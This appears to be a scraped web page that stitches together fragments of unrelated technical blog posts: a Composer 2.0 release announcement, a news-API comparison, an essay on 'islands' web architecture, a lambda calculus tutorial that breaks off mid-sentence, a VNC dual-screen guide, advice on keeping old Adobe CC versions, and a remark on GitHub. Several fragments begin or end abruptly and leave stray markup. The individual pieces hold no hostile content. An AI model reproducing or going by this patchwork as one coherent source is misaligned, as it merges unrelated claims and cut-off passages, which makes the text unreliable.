                <div>
                    <h2 id="1-what-s-new">1/ What's new?</h2><p>The list of changes and improvements is long, check the <a href="https://github.com/composer/composer/releases/tag/2.0.0">complete changelog</a> if you are interested in reading it all. I will highlight a few key points here.</p><h3 id="performance-improvements">Performance improvements</h3><p>We overhauled pretty much everything from the protocol used between Composer and packagist.org to the dependency resolution, including downloading files in parallel using curl and constraint evaluation optimizations. This leads to massive improvements in terms of both speed and memory usage. The difference depends on your use case, so while I've seen reports of improvements of over 50% to both in some projects, I cannot put an exact number on it. But I am sure you will be positively surprised if you haven't tried Composer 2 yet.</p><p>As a side note to this, <code>require</code>/<code>remove</code> and partial updates are now much faster because Composer will now only load the metadata of the packages which are being changed.</p><figure><img src="https://blog.packagist.com/content/images/2020/10/image_2020-10-24_175318.png" alt="" srcset="https://blog.packagist.com/content/images/size/w600/2020/10/image_2020-10-24_175318.png 600w, https://blog.packagist.com/content/images/size/w1000/2020/10/image_2020-10-24_175318.png 1000w, https://blog.packagist.com/content/images/2020/10/image_2020-10-24_175318.png 1455w" sizes="(min-width: 1200px) 1200px"><figcaption>Time for initial update + install (bootstrapped project, empty cache) shows roughly 60% less time used by Composer 2 with ext-curl enabled</figcaption></figure><h3 id="architectural-changes-and-determinism">Architectural changes and determinism</h3><p>The way dependency updates are done internally was refactored, which, for you, will result in more deterministic updates. The current local state of the vendor directory will not interfere in updates anymore. </p><p>After an update is complete, the install process is run automatically and it will now execute all network bound operations first - and in parallel if possible. This will avoid leaving you with a half-updated vendor directory if a network error occurs midway through installation.</p><h3 id="runtime-features">Runtime features</h3><p>We added a <a href="https://getcomposer.org/doc/07-runtime.md#platform-check">platform-check step</a> when <code>vendor/autoload.php</code> gets initialized which checks the current PHP version/extensions match what is expected by your dependencies and fails hard otherwise.</p><p>There is a new class, <code>Composer\InstalledVersions</code>, which is autoloaded in every project and is available at runtime. It allows you to check which packages/versions are present at runtime of your own project.</p><p>See the <a href="https://getcomposer.org/doc/07-runtime.md">runtime docs</a> for more details.</p><p>If your code relies on any of these runtime features, you should require <code>"composer-runtime-api": "^2.0"</code> in your composer.json. This is a virtual package which is provided by Composer and will make sure people have to use Composer 2.x to install your package.</p><h3 id="error-reporting-improvements">Error reporting improvements</h3><p>Because things don't always go the way they're supposed to, we made sure to improve the error reporting shown to you when dependencies cannot be resolved. It's hard to give concrete examples here as there are a million ways this can fail but you will hopefully notice that messages are now shorter, clearer and less repetitive.</p><h3 id="partial-updates-with-temporary-constraints">Partial updates with temporary constraints</h3><p>Sometimes it can be useful to upgrade or downgrade a single package to a specific version, perhaps temporarily to test something or wait for a bug fix. You can now run <code>composer update vendor/package:1.0.*</code> for example (or <code>1.0.12</code> or any other version constraint), to run an update of only <code>vendor/package</code> to a version matching this additional constraint. This will not update your require in composer.json, and it will not mark the lock file out of date.</p><p>If you want to add/restrict a constraint but still do a full update of all dependencies, you can use <code>update --with vendor/package:1.0.*</code> which will run the update with that additional constraint.</p><h2 id="2-how-easy-is-it-to-upgrade">2/ How easy is it to upgrade?</h2><p>Our goal is that every Composer user can upgrade smoothly and swiftly. The gains are huge and we want everyone to benefit from them. To achieve that we did a few things:</p><ul><li>Composer 2.0 still supports PHP 5.3 and above, much like Composer 1.x</li><li><code>composer.lock</code> files are interoperable between versions, so you can upgrade to 2.0 and roll back easily if needed.</li><li>Most commands and arguments remain the same, and largely what you know about Composer remains true in 2.0.</li></ul><p>If you run <code>composer self-update</code> from 1.x, it will warn you that a new stable major version of Composer is available, and you can use <code>composer self-update --2</code> to migrate to it.</p><p>Should you encounter issues, you can go back at any time by using <code>composer self-update --1</code>. Hopefully that will make everyone feel comfortable to experiment with the new release.</p><p>If you are <a href="https://getcomposer.org/doc/faqs/how-to-install-composer-programmatically.md">installing Composer automatically</a> from the installer script, and wish to remain on Composer 1.x for the time being, you can also pass it a <code>--1</code> argument to prevent it from installing Composer 2.0 by default. If you do this please remember and aim to upgrade in a timely manner, as Composer 1.x will not be maintained for very long.</p><h2 id="3-backwards-compatibility-breaks">3/ Backwards compatibility breaks?</h2><p>Here are the main things likely to cause trouble with the upgrade process:</p><ul><li><strong>Plugins</strong>: This is probably going to be the major source of problems for most people. Plugins need to be updated to support Composer 2, and some of them are not ready, yet. Composer 2 will complain and fail to resolve dependencies if a plugin does not support it, so no need to overthink it, you can try it out and see how it goes.</li><li>The new <strong>platform-check feature</strong> means that Composer checks the runtime PHP version and available extensions to ensure they match the project dependencies. If a mismatch is found, the autoloader exits with error details to make sure problems are not overlooked. To avoid issues when deploying to production it is recommended to run <code>composer check-platform-reqs --no-dev</code> with the production PHP process as part of your build or deployment process.</li><li><strong>Repository priority</strong>: If a package exists in a higher priority repository, it will now be entirely ignored in lower priority repositories. If you seem to be missing packages when using Composer 2, see <a href="https://getcomposer.org/repoprio">repository priorities docs</a> for details.</li><li><strong>Invalid PSR-0 / PSR-4 configurations</strong> will not autoload anymore in optimized-autoloader mode, as per the warnings introduced in Composer 1.10. Mostly these warnings were for classes that were not meant to autoload anyway so I don't expect major issues, but it's safer to clean these up before upgrading.</li></ul><p>If you want to know more, I would highly recommend reading the <a href="https://github.com/composer/composer/blob/master/UPGRADE-2.0.md">UPGRADE</a> guide which has multiple sections for end users, plugin authors and Composer repository implementors.</p><h2 id="4-what-s-next">4/ What's next?</h2><p>We don't have a very detailed feature roadmap anymore as 2.0 contains tons of new goodies, but one important thing I want to explain is our PHP version support going forward.</p><p>As I mentioned above, Composer 2.0 supports PHP 5.3+, which is at this point very outdated and makes the code quite hard to maintain in places. We went through the effort to make sure every Composer user can upgrade to Composer 2, but the plan is to drop support for EOL PHP versions in a future minor release.</p><p>Composer 2.1 might still come with PHP 5.3 support, depending on the timeline and which features end up being included, but then at the latest by Composer 2.2 we will drop support for everything older than PHP 7.1.3. According to our stats this allows over 90% of the Composer users to use the latest version, and for the others who are stuck on outdated PHP versions we will keep providing critical bug and security fixes in the 2.0.x or 2.1.x range.</p><p>As for Composer 1.x, it is now more or less EOL. It will also receive critical fixes if anything comes up but the goal for everyone should be to migrate to 2.x as soon as possible.</p><p>Finally I want to thank everyone who contributed and helped make this a reality. The 2.0 release represents over 1100 commits from 28 people, 150+ GitHub issues and pull requests, plus everyone who test it, reviewed PRs, etc. It has been a huge effort with the first commits made about two years ago.</p><p>I also want to thank all our <a href="https://packagist.com/">Private Packagist</a> customers who helped finance this effort and afforded us the time we spent on all this. We sincerely hope everyone will appreciate the result!</p>

              For the most basic use cases <a href="https://news.google.com/">Google News</a> or <a href="https://www.google.com/alerts">Google Alerts</a> may be enough, but both of these services have many limitations that prevent them from being used on a bigger scale.
            </p>
            <p>
              Unfortunately Google News does not provide a convenient way to retrieve a big amount of relevant data, as it poses a strict limit on the number of articles that could be retrieved per query. Yet another concern is rate limiting restrictions. Google News is primarily focused on human users, not robots, therefore you risk getting your ip banned when trying to make a large amount of queries programmatically.
            </p>
            <p>
              The search interface is also far from perfect, as it does not allow building complex queries, in contrast to
              <a href="https://www.elastic.co/what-is/elasticsearch">modern full-text search storage solutions</a>, which provide a wide variety of operators for building search queries of almost any complexity.

                    Google News provides a limited amount of metadata about each particular article. It usually includes the publication date, description field, title and the original article link.
                  </li>
                  <li>
                    Datanews API returns more additional information about each article, which is directly extracted from webpage: original article link, title, description, publication date, domain of the publication, url of the image on the article page, <span>list of authors</span>, language, country, <span>snippet of the content</span>.
                  </li>
                </ul>

                <p>Above information is much more useful for use cases such as data collection or public relations. Analyzing authors of the articles on the large scale allows PR firms to work more efficiently, as they will have more context about authors and journalists.</p>

              Choosing between <a href="https://news.google.com/">Google News</a> and other News API is really about your use case. If you need something simple just for personal use, then going with Google News or Google Alerts will make perfect sense.
            </p>
            <p>
              Otherwise, if you plan to build some software system with bigger scale, then going with an existing news API provider like <a href="https://datanews.io/">Datanews</a> will make more sense. It will provide you with a reliable and complete news monitoring solution that is ready to be integrated into your product.

<p>I’ve struggled to find references to this online, but heard the name used multiple times this year when describing the approach outlined here.</p>

<p>The general idea of an “Islands” architecture is deceptively simple: render HTML pages on the server, and inject placeholders or slots around highly dynamic regions. These placeholders/slots contain the server-rendered HTML output from their corresponding widget. They denote regions that can then be "hydrated" on the client into small self-contained widgets, reusing their server-rendered initial HTML.</p>

<p>You can think of this like a static HTML document that contains multiple separate embedded applications:</p>

<p>  
<img width="600" src="https://res.cloudinary.com/wedding-website/image/upload/v1596766231/islands-architecture-1.png">  
</p>

<p>This may seem similar to "micro-frontends" at first glance. Both approaches share the idea of breaking applications up into independent units, however "micro-frontends" do not typically imply that composition of those units is achieved using HTML.</p>

<p>A closer analog to the "islands" approach would be progressive enhancement, to which we're essentially adding SSR hydration and a consistent metaphor for adding interactivity to a region of the page. In traditional progressive enhancement, we might have a <code>&lt;script&gt;</code> that looks for an image carousel in the page and instantiates a jQuery plugin on it. Instead, that image carousel would be rendered on the server and a dedicated <code>&lt;script&gt;</code> emitted for it that loads the image carousel implementation and in-place upgrades it to be interactive.</p>

<h3 id="whydoesthismatter">Why does this matter?</h3>

<p>As it turns out, there are a number of benefits to the group of approaches described here when compared to typical Single Page Application architectures.</p>

<h5 id="progressivehydrationforfree">"Progressive Hydration" for free</h5>

<p>I’ve touted the performance benefits of <a href="https://www.youtube.com/watch?v=k-A2VfuUROg">Progressive Hydration</a> techniques for frameworks like React, Angular, Preact and Vue. With these architectures, individual widgets on a page are loaded and initialized over time. This can be done using a simple scheduling approach via requestIdleCallback, or can take additional factors into account like viewport visibility, interaction likelihood, product value, etc.</p>

<p>Similar to Progressive Hydration, rendering pages using an islands architecture results in the heavier dynamic portions of the page being initialized not just progressively, but <em>separately</em>. This means individual regions of the page become interactive without anything else on the page needing to be loaded first.</p>

<p>Unlike Progressive Hydration, the approaches that fall out of building around an islands architecture do not require top-down rendering. This is a distinct advantage, since there are no outer “root” components that must be initialized before their descendants. Each part of the page is an isolated unit, and a performance issue in one unit doesn't affect the others.</p>

<h5 id="seoanduxarentatradeoff">SEO and UX aren’t a tradeoff</h5>

<p>The status quo for SSR as used by Single Page Applications is that it’s often cited as a necessity for SEO reasons. However, SSR can actually have a net <em>negative</em> impact on User Experience - visitors are left waiting for the actual functionality of a page to arrive while staring at a frustratingly fake version of that page.</p>

<p>Many applications also suffer from silent SSR performance pitfalls without realizing it. In virtual DOM libraries, it's easy (and common) to accidentally construct a situation where first render destroys the server-rendered HTML DOM, only to recreate it again from scratch (often synchronously). This is the result of some common misconceptions, which may stem from documentation giving an idealized view of hydration while passing over tricky caveats and footguns.</p>

<p>Even in cases where SSR hydration is functioning as designed, the status quo leaves a lot to be desired. The amount of JavaScript work being performed during page load is still many orders of magnitude more than what might be considered "efficient".</p>

</figure>

<p>In an "islands" model, server rendering is not a bolt-on optimization aimed at improving SEO or UX. Instead, it is a fundamental part of how pages are delivered to the browser. The HTML returned in response to navigation contains a meaningful and immediately renderable representation of the content the user requested.</p>

<p>Sections of that HTML may be missing their client-side interactivity, but the document should at least contain the most essential content. For example: a news page’s HTML would contain the article body, and a product page would contain that product’s description.</p>

<p>All of the other content is secondary to this information, and its inclusion in the HTML becomes a product decision. How vital is this bit of information to a user visiting the page? How important is that widget to the business model? A "buy now" button that directly relates to revenue should be easily prioritized over a site feedback survey button that relates to information gathering.</p>

<h5 id="betterforaccessibilityanddiscoverability">Better for accessibility and discoverability</h5>

<p>A website that uses standard HTML links for navigation is easier for assistive technologies and web crawlers to use. This is true regardless of whether links or forms are intercepted by JavaScript and rerouted to client-side logic, because the underlying assumptions remain true: clicking a link navigates to the given page.</p>

<p>Anecdotally, think of the number of times you’ve been sent a “link” to what the sender assumed was the page they were viewing, only to realize the link contained none of the necessary information:</p>

<p>  
<img width="350" src="https://res.cloudinary.com/wedding-website/image/upload/v1596766231/islands-architecture-3.png">  
</p>

<p>Building page-based applications doesn't completely prevent these types of strange experiences, it only makes the decision to do so more direct. It makes the default outcome the accessible one.</p>

<hr>

<p>When it comes down to it, shipping an architecture that requires less code to do something is the type of long-term benefit your future self (or coworkers) will thank you for. It's possible — likely, even — that adopting a model like this requires more up-front design thinking. There are far few batteries-included options available for decomposing apps into independently deliverable widgets. Who knows, maybe we can fix that.</p>

    <p>I have recently become very interested in functional programming - using pure functional languages such as Haskell, as well as functional programming in JavaScript. One of the main areas of study that is often cited as significant for functional programmers is <strong>lambda calculus</strong>.</p>

<p>In this article I want to look at what lambda calculus is, why you might want to learn about it, and explain the key concepts and the terminology of lambda calculus using both lambda syntax and ‘equivalent’ JavaScript code snippets.</p>

<p>If after reading this you are interested in learning more about functional programming in JavaScript, I recommend this Udemy course (affiliate link):</p>

<p><a href="https://click.linksynergy.com/link?id=5FPU6FRy5w4&amp;offerid=507388.1537962&amp;type=2&amp;murl=https%3A%2F%2Fwww.udemy.com%2Fcourse%2Ffunctional-programming-for-beginners-with-javascript%2F">Functional Programming For Beginners With JavaScript</a></p>



<p>There are a few reasons to learn lambda calculus, the main ones I can think of are:</p>

<ol>
  <li>
    <p><strong>It embodies some of the most important concepts of functional programming</strong></p>

    <p>For example, pure functions, unary functions, currying.</p>
  </li>
  <li>
    <p><strong>The internals of many functional programming languages such as Haskell, are heavily based on lambda calculus</strong></p>

    <p>Understanding lambda calculus will help you to understand these languages.</p>
  </li>
  <li>
    <p><strong>Many concepts from lambda calculus are applicable to general purpose languages such as JavaScript.</strong></p>

    <p>Concepts such as pure functions, unary functions and currying are used in many general purpose programming languages, and are often used in functional JavaScript.</p>
  </li>
  <li>
    <p><strong>It is interesting</strong></p>

    <p>Lambda calculus is an interesting area of mathematics, and is relatively accessible to those with a minimal maths background.</p>
  </li>
</ol>



<p>Lambda calculus was invented by the mathematician <a href="https://en.wikipedia.org/wiki/Alonzo_Church">Alonzo Church</a> in the 1930s, and is what is known as a ‘computational model’. By that, I mean that it is a system which can be used to encode and compute algorithmic problems.</p>

<p>The computational model most of us are familiar with is the Turing machine. While lambda calculus is rather different to the Turing machine in its approach to computation, the two are formally equivalent - ie. any problem that can by solved using a Turing machine can be solved using lambda calculus, and vice versa.</p>

<p>That is to say, lambda calculus can be used to solve any problem that can be computed using a Turing machine (so anything that anyone has ever programmed with a computer)!</p>
<h2 id="lambda-calculus-basics">Lambda calculus basics</h2>

<p>Lambda calculus is very minimalistic in its rules/axioms. It is made up of just 3 basic components, or <strong>lambda terms</strong>:</p>

<ol>
  <li>
    <p><strong>Variable</strong> - a named token used in a function, which will be replaced by concrete arguments when the function is applied.</p>
  </li>
  <li>
    <p><strong>Abstraction</strong> - a function, made up of a head and a body separated by a ‘\(.\)’</p>

    <ul>
      <li>The head is a lambda followed by a variable name.</li>
      <li>The body is an expression.</li>
    </ul>
  </li>
  <li>
    <p><strong>Application</strong> - a function invokation.</p>
  </li>
</ol>

<p>An <strong>expression</strong> is a variable, an abstraction, an application, or any combination of these.</p>

<p>In addition, parentheses are used in lambda calculus to indicate the order of evaluation.</p>

<p>This is all we get in lambda calculus! It is quite amazing that using these 3 lambda terms we calculate pretty much anything!</p>

<p>It is worth noting the absence of any of the constructs of basic arithmetic, such as numbers, addition, subtraction, multiplication, division etc - these are not within the basic axioms of lambda calculus.</p>

<p>Numbers and arithmetic operations can be defined in terms of lambda calculus via <a href="https://en.wikipedia.org/wiki/Church_encoding">Church Encoding</a> (which is outside the scope of this article). Rather than working from first principles every time we need them, we can choose to use numbers and basic arithmetic operators for convenience.</p>

<h2 id="a-simple-example---the-identity-function">A simple example - the identity function</h2>

<p>The following function is known as the identity function, it takes a value and returns that same value.</p>

<p>In JavaScript we can easily define and execute this function:</p>

<pre><code>const identity = x =&gt; x;
identity(3) // 3
</code></pre>

<p>We can write the same function using lambda calculus as follows:</p><p>

\[\lambda x . x\]

</p><p>In the above:</p>
<ul>
  <li>\(x\) is a variable.</li>
  <li>
    <p>\(\lambda x . x\) is an abstraction.</p>

    <ul>
      <li>\(\lambda x\) is the head of the abstraction</li>
      <li>\(x\) is the body of the abstraction.</li>
    </ul>
  </li>
</ul>

<p>To perform an application, ie. apply the function to a concrete argument, we use the following syntax:</p><p>

\[(\lambda x . x) \ 3\]

\[[x := 3]\]

\[3\]

</p><p>In the above, the \([x := 3]\) syntax indicates that we are going to substitute all instances of \(x\) in the function with \(3\). The above process is known as beta reduction, which I will talk more about now.</p>

<h2 id="beta-reduction">Beta reduction</h2>

<p>In JavaScript when we invoke a (pure) function with its arguments, the function gets evaluated and it returns the evaluated result:</p>

<pre><code>const f = (x, y) =&gt; x(y);

f(z =&gt; z + 1, 3); // 4
</code></pre>

<p>Here, <code>f</code> takes 2 arguments - a function <code>x</code> and a value <code>y</code>, and calls <code>x</code> with <code>y</code> as an argument.</p>

<p>In lambda calculus, the process of applying concrete arguments to an abstraction, and reducing the resulting expression is known as <strong>beta reduction</strong>.</p>

<p>The equivalent to the above JavaScript function <code>f</code>, when written with lambda calculus, is:</p><p>

\[\lambda x y . x y\]

</p><p>This time, we have an application in the body of the abstraction: \(x y\), this means ‘call \(x\) with \(y\) as an argument’. We can pass arguments to the abstraction and beta reduce it as follows:</p><p>

\[(\lambda x y . x y) \ (\lambda z . z + 1) \ 3\]

\[[x := \lambda z . z + 1]\]

\[(\lambda y . (\lambda z . z + 1) \ y) \ 3\]

\[[z := y]\]

\[(\lambda y . y + 1) \ 3\]

\[[y := 3]\]

\[4\]

</p><p><strong>Beta normal form</strong> is the most simplified form of an expression, ie. when it cannot be beta reduced the terms in an expression any further. In the above example \(4\) is the beta normal form of the application.</p>

<h2 id="alpha-equivalence">Alpha Equivalence</h2>

<p>In JavaScript, renaming a function’s parameters has no effect on the behaviour of the function.</p>

<pre><code>// The following are equivalent.
const myFunc1 = (x, y) =&gt; x * x;
const myFunc2 = (y, x) =&gt; y * y;
</code></pre>

<p>Similarly, in lambda calculus renaming variables within a function also has no effect. We say that abstractions which differ only in their variable names are <strong>alpha equivalent</strong>.</p>

<p>The following is an example of 2 abstractions which are alpha equivalent:</p><p>

\[\lambda x y . xx\]

\[\lambda y x . yy\]

</p><h2 id="bound-and-free-variables">Bound and free variables</h2>

<p>In JavaScript, the return value of a function can be calculated us both its parameters, and variables which the function closes over:</p>

<pre><code>const z = 5;
// z, in the context of our function, is a free variable.
const f = (x, y) =&gt; z + (x * y);

f(2, 3); // 11 === z + 6
</code></pre>

<p>Similarly, lambda calculus abstractions can make use of both variables which are defined in the head of the abstraction, and other, ‘unknown’ variables which are not. In lambda calculus:</p>

<ul>
  <li><strong>Bound variables</strong> are variables used in an abstraction which appear in the head of the abstraction.</li>
  <li><strong>Free variables</strong> are variables used in an abstraction which do not appear in the head, their value is taken to be unknown within the context of the abstraction.</li>
</ul>

<p>If we express the JavaScript function defined above in lambda calculus, we get:</p><p>

\[\lambda x y . z + (x * y)\]

</p><p>And now applying arguments to this function and beta reducing it:</p><p>

\[(\lambda x y . z + (x * y)) \ 2 \ 3\]

\[[x := 2]\]

\[(\lambda y . z + (2 * y)) \ 3\]

\[[y := 3]\]

\[z + 6\]

</p><p>The notable difference here is that in our JavaScript function, we assigned a value to <code>z</code>, whereas in the lambda calculus, we just evaluated the function as far as we could without knowing \(z\).</p>

<p>Even though it is not a numerical result, \(z + 6\) is the beta normal form of this application.</p>

<h2 id="unary-functions-and-currying">Unary functions and currying</h2>

<p>Up until now we have been making a simplification, and viewing lambda functions as functions which take one or more arguments and return a single value.</p>

<p>This is <em>not actually correct</em>.</p>

<p>Every lambda function takes a single argument and returns a single result, and this type of function is know as a <strong>unary function</strong>.</p><p>

\[\lambda x y z . x * y * z\]

</p><p>Is actually shorthand for</p><p>

\[\lambda x . (\lambda y .  (\lambda z . x * y * z))\]

</p><p>This is function with a single parameter \(x\), which when invoked returns another function with a single parameter \(y\), which when invoked returns another function with a single parameter \(z\), which when invoked returns the value of \(x * y * z\)</p>

<p>In JavaScript, the above function looks like:</p>

<pre><code>const f = x =&gt; y =&gt; z =&gt; x * y * z;
</code></pre>

<p>If you have done any functional programming in JavaScript then this way of writing a function may look familiar. Taking a function which takes many arguments, and breaking it down into a series of unary functions (which each take a single argument) is known as <strong>currying</strong>.</p>

<p>We can invoke the above function either by passing all of its arguments and immediately obtaining the final result, or, we can first create a more specific function by passing only some arguments, and then call this function later to get the final result.</p>

<pre><code>// Call our function with 3 arguments.
f(2)(3)(4); // 24

// Call our function with 2 arguments to create a more specialised function.
const multiplyBySix = f(2)(3);

multiplyBySix(4); // 24
</code></pre>

<p>In JavaScript we have the choice to either use curried unary functions, or functions which take more than one argument.</p>

<p>In lambda calculus, all functions are curried unary functions, despite that fact that we often use the aforementioned shorthand which makes them appear as if they take multiple arguments.</p>



<p>Just as not all JavaScript function calls can be evaluated to produce a value, not all lambda functions reduce to a beta normal form upon application. Consider the following, somewhat contrived piece of JavaScript:</p>

<pre><code>const f = x =&gt; x(x);
f(f);
</code></pre>

<p>This is a little confusing. We define a function <code>f</code>, which takes a function <code>x</code> and calls it with itself as an argument. On the next line, we call <code>f</code> with itself, which will recursively continue to call f with itself, and mayhem ensues.</p>

<p>If you execute the above code, you will get a max call stack size exceeded error. Conceptually we can think of what happens as something like:</p>

<pre><code>f(f(f(f(f(f(...)))))); // and so on, until we reach the maximum call stack size.
</code></pre>

<p>In lambda …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>Dual screen workflows without screens across operating systems</p></blockquote><h2 id="background">Background</h2><p>My X380 sadly has been having port issues. This meant that my M14 was no longer a viable option for my second screen needs.</p><h2 id="outline">Outline</h2><p>The general form of the solution works in one of two ways:</p><dl><dt>VNC Viewer</dt><dd>Where the (second-screen) laptop connects to a VNC server on the primary laptop</dd><dt>Peripheral Shares</dt><dd>Where the secondary laptop runs a server to enable proxying mouse and keyboard access from the primary laptop</dd></dl><h2 id="vnc-and-windows">VNC and Windows</h2><p>For laptops running Windows, I personally just set up <a href="https://tightvnc.com/">TightVNC</a>. The standard settings work well enough for the peripheral share described below.</p><p>This is best used for working with Windows only stuff like Office.</p><h2 id="vnc-and-linux">VNC and Linux</h2><p>For the secondary laptop we need to run a server (<code>tigervnc</code>) without setting an external screen.</p><div><pre><code data-lang="bash">x0vncserver -rfbauth ~/.vnc/passwd
</code></pre></div><p>Now on the main laptop, we will simply leverage <code>x2vnc</code> to extend into the secondary laptop.</p><p>Where we can get the IP (local) by checking with <code>ifconfig</code> on the secondary laptop.</p><h4 id="meta">Meta</h4><p>This works best when combined with a networked file-system, since then you can interact with files in tandem. Otherwise, there is quite a bit of <code>git</code> based back and forth.</p><h2 id="vnc-and-android">VNC and Android</h2><p>There are two parts to this solution. Note that, as Android devices don’t run X11 systems in a meaningful way, the direct access method is through a paid application, a2vnc server lite, which also did not work well in my tests. We will therefore focus on setting a VNC viewer up to connect to the primary laptop.</p><h3 id="primary-settings">Primary Settings</h3><h4 id="xrandr-setup">XRandR Setup</h4><p>For the primary laptop, we will start by obtaining our present screens configuration.</p><div><pre><code data-lang="bash">xrandr <span>|</span> grep <span>" connected"</span>
</code></pre></div><div><pre><code data-lang="bash">eDP1 connected primary 1920x1080+1920+0 <span>(</span>normal left inverted right x axis y axis<span>)</span> 290mm x 170mm
</code></pre></div><p>Naturally your output will differ. We also need the resolution of the Android device. In my case, they are the same. At this point we are ready to figure out the mode-line.</p><div><pre><code data-lang="bash"><span># 1920x1080 @ 60.00 Hz (GTF) hsync: 67.08 kHz; pclk: 172.80 MHz</span>
Modeline <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Let us now use this information to create a bunch of modelines.</p><div><pre><code data-lang="bash">xrandr --newmode <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Note that we can create more of these in the same manner. We can now move forward with making a virtual screen.</p><div><pre><code data-lang="bash">xrandr --addmode VIRTUAL1 1920x1080_60.00
</code></pre></div><p>We can now finally set up the output.</p><div><pre><code data-lang="bash">xrandr --output VIRTUAL1 --mode 1920x1080_60.00 --left-of eDP1
</code></pre></div><p>Note that it is better to use <code>mons</code> to work with our newly created virtual screen.</p><p>This is still a bit ugly, since the process needs to be repeated with each reboot.</p><h4 id="vnc-setup">VNC Setup</h4><p>Now we need prepare our VNC. <code>x11vnc</code> is recommended at the moment.</p><div><pre><code data-lang="bash">x11vnc -vencrypt nodh:only-ssl -ssl SAVE -clip 1920x1080+0+0
</code></pre></div><h3 id="android-settings">Android Settings</h3><p>For this section, I personally use <a href="https://play.google.com/store/apps/details?id=com.iiordanov.bVNC&amp;hl=en&amp;gl=US">bVNC Pro</a>. The setup is pretty dead simple. A basic VNC connection is all that is required.</p><p>In practice, I use the x86 setup, with the secondary laptop acting as a viewer for a virtual screen, mostly because that way I can tune into multiple Zoom meetings (a bonus).</p><h2 id="conclusion">Conclusion</h2><p>The final setup is quite robust to changes. Future posts might go into setting up the kind of local networking tools to help move files, code and more between both machines, to improve on the peripheral share approach. Additionally, there are still some manual steps which can and should be automated. I’m not super pleased with the setup, it takes longer than a wireless sceen</p></div></div>]]>

<p><span>What is the trick? On install,<strong> uncheck “Remove old versions”</strong>. That’s it! And you’ll keep your older versions of InDesign (or Photoshop, or whatever).</span></p>
<p><span><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27480%27%20height%3D%27270%27%20viewBox%3D%270%200%20480%20270%27%3E%3Crect%20width%3D%27480%27%20height%3D%273270%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_UpdateRemoveOld.gif" alt="Install updates without removing old versions of Adobe CC apps" width="480" height="270"></span></p>
<p><span>You can also enable auto-update and tell it to keep your old versions.</span></p>
<p><span><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27480%27%20height%3D%27270%27%20viewBox%3D%270%200%20480%20270%27%3E%3Crect%20width%3D%27480%27%20height%3D%273270%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_PreferencesRemoveOld.gif" alt="Change Preferences for Adobe CC apps to auto-update but not remove old versions" width="480" height="270"></span></p>
<h3><span>How do I get back a previous version of an Adobe CC application that was unintentionally removed?</span></h3>
<p><span>This option is a little less hidden than it has been in the past. It really is quite simple:</span></p>
<p><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27480%27%20height%3D%27270%27%20viewBox%3D%270%200%20480%20270%27%3E%3Crect%20width%3D%27480%27%20height%3D%273270%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_OtherVersions.gif" alt="Install previous Adobe app versions with the Other Versions option" width="480" height="270"></p>


<p><span>With the recent release of Adobe CC 2021, we’ve fielded the same questions that we received with previous Creative Cloud updates. Three main questions arise:</span></p>
<ol>
<li>Why would I want to keep a previous version of Adobe CC apps (such as InDesign) around?</li>
<li>How do I keep previous versions of an Adobe CC application as I install the new one?</li>
<li>How do I install a previous version of an Adobe CC application when I find it was unintentionally removed?</li>
</ol>
<h3>Why might I want to keep previous versions of Adobe CC applications (such as InDesign) around?</h3>
<p>Out with the old, in with the new, right? In this age of phones and app stores, software moves at a much faster pace than traditional PC applications, especially those in the world of print and serious graphics. The average App Store application has a lifespan of one month, and “auto-update” is all the rage among web browsers, phone apps, even PC applications. Plus, with the modern subscription paradigm, as embraced by Adobe these days, upgrading is FREE! It is also free to keep older versions.</p>
<p>Sure, you can take the plunge, easily, but there may be reasons to pause and consider, “should I kill the old version while moving to the new?” I think the reality is that users should install the new CC 20XX version when available. Yet, in most cases, <strong>it is a best practice to keep the older version as well.</strong></p>
<h4>Why might I want to keep the previous version of CC around?</h4>
<p>There are at least two reasons you may wish to keep CC 2019 on your computer while you install CC 2020:</p>
<ol>
<li>You have validated production workflows in CC 2019 and <strong>haven’t yet tested</strong> these in CC 2020.</li>
<li>Your workflow includes <strong>third-party plugins that don’t yet work with CC 2020. </strong>In most cases, it takes anywhere from a few days to a few months for third-party developers to update their plugins to the new CC version.</li>
</ol>
<h4>You don’t need to choose between CC 2020 and CC 2021!</h4>
<p>As far as Adobe software goes, the upgrade decision doesn’t need to be either/or between the new and previous version. This seems to be a very common mis-conception. <strong>Versions of InDesign and other CC apps co-exist quite nicely.&nbsp;</strong>This has been the case from time immemorial. It has always been an option to <strong>add</strong> the new version <strong>without removing</strong> the older version.</p>
<p>You might think this is a Boolean decision – just one version or the other – because CC apps by default will remove old versions on install. But no, <strong>it is easy to choose to keep the previous version</strong> (though this would be the default, in an ideal world) if you know how to do it.</p>
<p><span>Please&nbsp;<a href="mailto:maxdunn@siliconpublishing.com" rel=" noopener">email us</a> if you can’t figure out how to put back a previous version, or if you have questions about maintaining multiple versions of Creative Cloud applications.</span></p>

<p>Published on <span id="published">2020-10-23</span>. Modified on <span id="modified">2020-10-25</span>.</p>
<p>Thousands of the worlds best Open Source projects are still hosting their code repositories on GitHub. Since Microsoft has purchased GitHub this has become a serious problem.</p>

<p><strong>Update 2020-10-25:</strong> This is not directly related as it could happen on other hosting platforms as well, but just a few hours after I wrote this the youtube-dl repository was taken down from GitHub by RIAA due to a <a href="https://github.com/ytdl-org/youtube-dl/">DMCA request</a>.</p>

